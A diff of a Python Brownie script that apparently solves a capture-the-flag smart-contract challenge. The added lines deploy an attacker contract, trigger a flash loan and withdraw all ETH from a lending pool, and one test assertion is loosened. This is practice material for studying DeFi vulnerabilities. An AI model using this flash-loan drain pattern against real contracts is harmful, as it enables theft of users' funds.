@@ -38,9 +38,12 @@ def main():
             # Not checking exactly how much is the final balance of the attacker,
             # because it'll depend on how much gas the attacker spends in the attack
             # If there were no gas costs, it would be balance before attack + ETHER_IN_POOL
+            
             assert pool.balance() == 0
-            assert attacker.balance() == ATTACKER_INITIAL_ETH_BALANCE
+            assert attacker.balance() >= ATTACKER_INITIAL_ETH_BALANCE
+
             return True
+
         except:
             return False
 
@@ -55,11 +58,22 @@ def main():
 # You must take all ETH from the lending pool. 
 # #########################################################
 
-    #############################
-    ##### SOLUTION GOES HERE ####
-    #############################
+    ##############################
+    ##### SOLUTION GOES HERE #####
+    ##############################
 
-        
+    # import attacker contract
+    from brownie import FlashLoanEtherReceiver
+
+    # deploy attacker contract
+    receiver = FlashLoanEtherReceiver.deploy(pool.address, _fromAttacker)
+
+    # execute flashloan with 0 ether in the amount
+    # which calls execute
+    receiver.flashLoan(_fromAttacker)
+
+    # withdraw all the ether that's credited to the attacker contract from the pool
+    receiver.withdrawFromPool(_fromAttacker)
 
 ###############################################################
 ###################### CHECKING SOLUTION ######################
